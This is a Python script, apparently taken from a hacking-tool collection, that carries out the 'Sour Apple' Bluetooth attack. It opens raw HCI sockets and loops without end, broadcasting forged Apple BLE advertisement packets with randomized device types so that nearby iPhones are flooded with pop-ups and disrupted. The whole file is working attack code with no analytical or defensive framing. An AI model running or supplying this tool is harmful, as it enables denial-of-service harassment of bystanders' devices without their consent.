# Credits to https://github.com/RapierXbox
import random
import bluetooth._bluetooth as bluez # sudo pip install pybluez
from time import sleep
import struct
import socket
import array
import threading
import time
import os
import fcntl
from errno import EALREADY

def setup_device(device_id):
    try:
        hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        req_str = struct.pack("H", device_id)
        request = array.array("b", req_str)
        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
    except IOError as e:
        if e.errno != EALREADY:
            raise
    finally:
        hci_sock.close()

def send_packet(sock, delay=1):
    types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
    bt_packet = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                 random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
                 random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
    cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)
    cmd_pkt = struct.pack("<B", 0x01)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
    cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
    bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)
    cmd_pkt = struct.pack("<B", 0x00)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
    sleep(delay)

def SourApple(inf):
    print("Sour Apple Attack Initiated...")
    ids = []
    for id in inf:
        ids.append(int(id.replace("hci","")))
    device_ids = ids  # Device IDs for hci0 and hci1
    socks = []

    for device_id in device_ids:
        setup_device(device_id)
        try:
            sock = bluez.hci_open_dev(device_id)
            socks.append(sock)
        except Exception as e:
            print(f"Unable to connect to Bluetooth hardware {device_id}: {e}")

    print("Hold on tight, we are flying far away!")
    try:
        while True:
            for sock in socks:
                send_packet(sock)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        for sock in socks:
            cmd_pkt = struct.pack("<B", 0x00)
            bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
            sock.close()